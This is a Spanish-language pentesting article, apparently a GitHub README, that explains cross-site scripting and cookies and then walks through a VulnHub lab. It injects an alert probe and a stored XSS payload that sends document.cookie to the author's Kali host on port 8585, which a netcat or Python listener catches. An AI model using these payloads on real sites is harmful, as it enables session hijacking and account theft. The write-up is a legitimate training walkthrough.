<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=D1F700&width=435&lines=Ataque+XSS+y+secuestro+de+Cookies"></a>
</p>

<h1 align="center"></h1>

<h3 align="center"><ins>VULNERABILIDAD XSS</ins></h3>

Cross-Site Scripting (XSS) es uno de los ataques más conocidos y explotados en entornos web, forma parte de las 10 vulnerabilidades más frecuentes en aplicaciones web desde 2014, algunas estadísticas afirman que el 70% de los sitios web tienen al menos una vulnerabilidad de XSS. Este ataque se aprovecha de fallas de seguridad de sitios y aplicaciones web ya que permite a un atacante cargar scripts maliciosos en un sitio web del lado del navegador para que un usuario desprevenido visite el sitio y sea infectado, tal como robar sus cookies (credenciales), realizar un defacement, cargar un código malicioso para obtener sesión de la máquina víctima o simplemente redirreccionar al usuario a otro sitio malicioso (phishing).

#### ¿Cómo se inyecta el script malicioso?

Normalmente el atacante lo que hace es buscar una entrada de datos en el sitio web, como puede ser un simple input de búsqueda o formularios/campos de comentarios, así como en la misma URL con un payload precargado.

### Tipos de ataques de Croo-Site Scripting

Existen tres tipos de vectores de XSS:

**XSS indirecto** (reflejado): Es el tipo de ataque más común, el atacante inyecta el script en el sitio web y esté es ejecutado cuando el usuario hace una petición al servidor web, es entonces cuando se carga el script y se muestra como un mensaje de error. Por el lado de la víctima, se mostrará dicho mensaje y que deberá hacer clic en el enlace que se le indique, ejecutando así el código malicioso y descargando el malware en su equipo.

**XSS directo** (persistente): En este caso, el ataque persistente infecta todas las respuestas HTTP a través de la carga maliciosa por parte del atacante, la diferencia con el reflejado es que en este no es necesario atraer a la víctima y redireccionarla con un enlace; lo único que tiene que hacer es esperar que está haga clic sobre algún campo de comentario y el hackeo se produce automático, o mejor dicho, de forma pasiva.

**XSS basado en DOM**: El tercer ataque intenta escabullirse lo más que pueda, volviéndola difícil de detectar si no se profundiza el código línea por línea. El payload del ataque se ejecuta en la modificación del entorno DOM en el navegador de la víctima utilizado por el código del lado del cliente original, es decir, la respuesta HTTP no cambia, pero el contenido de la página se ejecuta de manera diferente debido a las modificaciones maliciosas del script producido en el entorno DOM. Por ejemplo, al escribir código Javascript en la URL para ser tomado como parte del HTML.

<p align="center">
  <img src="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/WEB/img/ataqueXSS.png">
</p>

</br>

#### Cookies

Las cookies es un fragmento de información que es enviada por un sitio web y es almacenada en el navegador del usuario. Permite que los sitios web accedan a la información con fines estadísticos, ofrecer mejor experiencia y servicios útiles; tomando como muestra nuestra ubicación, idioma, intereses, entre otras para ofrecernos publicidad orientada. 

Desde antes ya existían las cookies solamente que no eran obligatorias mostrarlas, desde entonces cada vez que visitamos un sitio web, estas están obligadas a mostrar un mensaje de advertencia de uso de cookies y sus políticas. Las cookies son archivos temporales y su duración es temporal, por lo que podemos configurarlas, borrarlas o bloquearlas con extensiones gratuitas del navegador. Se vuelven peligrosas cuando no se suele avisar al usuario ya que pueden recopilar otros datos confidenciales.

<h1 align="center"></h1>

### DETECTAR DETECTAR VULNERABILIDAD XSS

Como muestra de ejemplo, descargué una máquina de vulnhub llamada "<a href="https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/">*PENTESTER LAB: XSS AND MYSQL*"</a> para demostrar como es posible aprovecharse de esta vulnerabilidad en un entorno controlado y legal.

![1](https://user-images.githubusercontent.com/75953873/187095720-5b148555-7d80-40b8-95b5-0d301acaf744.png)

Servidor web: `http://192.168.25.135`

Nmap contiene un script para detectar posibles vectores vulnerables a XSS.
```
nmap -p80 --script http-stored-xss.nse <TARGET>
```
![2](https://user-images.githubusercontent.com/75953873/187103485-4175545b-bcf0-49a0-9398-3ea6b2502d44.png)

También podemos hacer uso de herramientas como <a href="https://github.com/s0md3v/XSStrike">XSStrike</a>, <a href="https://github.com/pwn0sec/PwnXSS">PwnXSS</a>, entre otras existentes.

![3](https://user-images.githubusercontent.com/75953873/187104187-dc163b7c-8143-4ba5-be3a-cd23cf677eaf.png)

Pero el objetivo del post es detectar y explotar vulnerabilidad XSS de forma manual, y para eso, es preciso contar con básicos conocimientos de Javascript para inyectar código del lado del navegador y que esté sea leído y ejecutado. La ventaja de llevarlo manual es que no hace mucho ruido, por ejemplo el siguiente código emitirá una alerta y sabremos si es vulnerable a XSS o no:
```javascript

<script>alert("Vulnerable a XSS");</script>
```
![4](https://user-images.githubusercontent.com/75953873/187104531-69d35d55-df37-417c-9db1-cc1302f1155a.png)

Luego de hacer clic en "Submit" mostrará el mensaje de alerta.

![5](https://user-images.githubusercontent.com/75953873/187104588-eaaeca8f-ac55-4567-a058-fe27c894e108.png)

<h1 align="center"></h1>

### SECUESTRO DE COOKIES

Definitivamente la página es vulnerable a Cross-Site Scripting, cuando otro usuario intente hacer un comentario se ejecutará la alerta anterior, pero... -¿y ahora qué?- Bueno, aquí es donde hay que exprimir todo el jugo a esta vulnerabilidad. Según la web hay un panel de administración así que intentaré robar las cookies de un usuario privilegiado e iniciar sesión, y para ello usaré el siguiente script:
```javascript

<script>document.write('<img src="http://192.168.1.9:8585/?'+document.cookie+' "/>");</script>
```
La dirección IP local es la de mi máquina (Kali) y el puerto 8585 es donde se va a escribir y almacenar la cookie.

![6](https://user-images.githubusercontent.com/75953873/187104762-5a305614-8366-4d1e-90b3-64790bb5ebe9.png)

Ahora lo que haremos es poner a escucha el puerto 8585 y esperar a que un usuario inicie sesión para capturar la cookie. Para esto podemos usar Netcat o Python:
```
Netcat: nc -lvnp 8585
Python3: python3 -m http.server 8585
```
![7](https://user-images.githubusercontent.com/75953873/187104875-9ea540b9-0fd4-464f-b23e-c5c769cd215d.png)
